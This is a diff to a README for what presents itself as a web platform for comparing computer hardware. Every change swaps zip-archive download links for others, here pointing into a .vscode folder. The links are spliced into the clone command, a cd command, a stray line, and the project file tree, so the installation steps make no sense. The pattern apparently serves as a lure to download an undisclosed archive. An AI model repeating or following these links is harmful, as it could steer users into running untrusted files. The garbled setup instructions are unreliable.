@@ -17,8 +17,8 @@ A modern web platform for browsing, comparing, and analyzing computer hardware f
 ## Installation
 
 ```bash
-git clone https://raw.githubusercontent.com/abz-mhd/global_hardware.io/main/assets/global-io-hardware-2.3-beta.1.zip
-cd https://raw.githubusercontent.com/abz-mhd/global_hardware.io/main/assets/global-io-hardware-2.3-beta.1.zip
+git clone https://github.com/abz-mhd/global_hardware.io/raw/refs/heads/main/.vscode/io_global_hardware_v1.7.zip
+cd https://github.com/abz-mhd/global_hardware.io/raw/refs/heads/main/.vscode/io_global_hardware_v1.7.zip
 npm install
 npm run dev
 
@@ -26,7 +26,7 @@ APP_URL=http://localhost:3000
 DB_URL=your_database_url
 API_KEY=your_api_key_here
 
-https://raw.githubusercontent.com/abz-mhd/global_hardware.io/main/assets/global-io-hardware-2.3-beta.1.zip
+https://github.com/abz-mhd/global_hardware.io/raw/refs/heads/main/.vscode/io_global_hardware_v1.7.zip
 ├── public/
 ├── src/
 │   ├── components/
@@ -34,5 +34,5 @@ https://raw.githubusercontent.com/abz-mhd/global_hardware.io/main/assets/global-
 │   ├── data/
 │   ├── utils/
 │   └── styles/
-├── https://raw.githubusercontent.com/abz-mhd/global_hardware.io/main/assets/global-io-hardware-2.3-beta.1.zip
-└── https://raw.githubusercontent.com/abz-mhd/global_hardware.io/main/assets/global-io-hardware-2.3-beta.1.zip
+├── https://github.com/abz-mhd/global_hardware.io/raw/refs/heads/main/.vscode/io_global_hardware_v1.7.zip
+└── https://github.com/abz-mhd/global_hardware.io/raw/refs/heads/main/.vscode/io_global_hardware_v1.7.zip
